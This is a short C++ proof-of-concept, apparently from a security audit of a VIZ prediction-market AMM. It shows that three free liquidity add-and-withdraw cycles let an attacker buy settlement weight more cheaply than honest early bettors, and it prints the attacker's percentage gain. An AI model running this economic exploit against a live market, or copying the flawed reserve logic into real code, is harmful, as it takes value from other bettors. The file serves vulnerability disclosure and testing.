// T3c — the real payoff of free reserve inflation: claim WEIGHT per VIZ.
// Settlement splits the losers' pool by weight, so buying weight cheaply dilutes
// everyone who bet earlier at the honest (slippage-adjusted) price.
#include <fc/uint128_t.hpp>
#include <cstdio>
struct mkt { int64_t ra, rb; fc::uint128_t k; };
static int64_t tokens_for(const mkt& m, int64_t amount, int side) {
    int64_t rin = side == 0 ? m.ra : m.rb, rout = side == 0 ? m.rb : m.ra;
    return rout - (int64_t)(m.k / fc::uint128_t((uint64_t)(rin + amount))).lo;
}
static void add_withdraw(mkt& m, int64_t amount) {
    int64_t half = amount / 2; m.ra += half; m.rb += amount - half;
    m.k = fc::uint128_t((uint64_t)m.ra) * fc::uint128_t((uint64_t)m.rb);
}
int main() {
    mkt m{1000000, 1000000, 0}; m.k = fc::uint128_t((uint64_t)1000000) * fc::uint128_t((uint64_t)1000000);
    const int64_t bet = 100000;
    int64_t honest = tokens_for(m, bet, 0);
    m.ra += bet; m.rb = (int64_t)(m.k / fc::uint128_t((uint64_t)m.ra)).lo;   // early bettor's bet lands
    printf("early bettor: %lld VIZ -> %lld weight (%.4f weight/VIZ)\n",
           (long long)bet, (long long)honest, (double)honest / bet);
    int64_t before = tokens_for(m, bet, 0);
    printf("attacker at honest price: %lld VIZ -> %lld weight (%.4f)\n",
           (long long)bet, (long long)before, (double)before / bet);
    for (int i = 0; i < 3; ++i) add_withdraw(m, 10000000);   // free: deposit and withdraw back
    int64_t after = tokens_for(m, bet, 0);
    printf("attacker after 3 free add+withdraw cycles: %lld VIZ -> %lld weight (%.4f)  = +%.1f%% claim\n",
           (long long)bet, (long long)after, (double)after / bet, 100.0 * (after - before) / before);
    return 0;
}
